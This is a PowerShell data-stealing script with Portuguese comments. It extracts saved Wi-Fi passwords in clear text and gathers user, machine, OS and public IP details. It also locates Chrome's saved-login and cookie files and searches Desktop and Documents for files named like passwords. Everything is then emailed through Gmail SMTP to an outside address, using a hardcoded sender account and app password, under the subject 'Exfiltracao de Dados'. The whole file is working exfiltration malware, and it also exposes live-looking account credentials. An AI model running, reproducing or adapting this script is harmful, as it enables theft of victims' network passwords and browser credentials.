# --- CONFIGURAÇÕES ---
$email_Enviante = "lcsdevsvoltou@gmail.com"
$senha_Enviante = "zbez khhk eiey hptx"
$email_Recebedor = "scheuerlucar14102007@gmail.com"

# 1. Coleta de Senhas de Wi-Fi
$wifi = netsh wlan show profiles | Select-String "\:(.*)$" | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content\s*:\s*(.*)$").Matches.Groups[1].Value.Trim()
    "WiFi: $name | Pass: $pass"
}

# 2. Coleta de Informações do Sistema e Rede
$ipPublico = (Invoke-WebRequest -uri "https://api.ipify.org").Content
$os = (Get-WmiObject Win32_OperatingSystem).Caption
$sysInfo = "User: $env:USERNAME | PC: $env:COMPUTERNAME | OS: $os | IP: $ipPublico"

# 3. Coleta de Credenciais e Arquivos Sensíveis
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
$localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"

# Busca por arquivos de texto que contenham 'password' ou 'senha' no nome no Desktop e Documentos
$searchPaths = "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents"
$foundFiles = Get-ChildItem -Path $searchPaths -Include *password*,*senha* -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName

$dataCollected = "Caminho Senhas Chrome: $chromePath `nCaminho Cookies: $cookiesPath `nLocal State: $localState `n`nArquivos Suspeitos: `n$foundFiles"

# Consolida tudo em um texto
$finalReport = "$sysInfo `n`n--- WIFI ---`n$wifi `n`n--- DATA ---`n$dataCollected"

# 4. Envio por E-mail via SMTP Gmail
$smtpClient = New-Object Net.Mail.SmtpClient("smtp.gmail.com", 587)
$smtpClient.EnableSsl = $true
$smtpClient.Credentials = New-Object System.Net.NetworkCredential($email_Enviante, $senha_Enviante)

$mailMessage = New-Object Net.Mail.MailMessage
$mailMessage.From = $email_Enviante
$mailMessage.To.Add($email_Recebedor)
$mailMessage.Subject = "Exfiltracao de Dados - $env:COMPUTERNAME"
$mailMessage.Body = $finalReport

$smtpClient.Send($mailMessage)
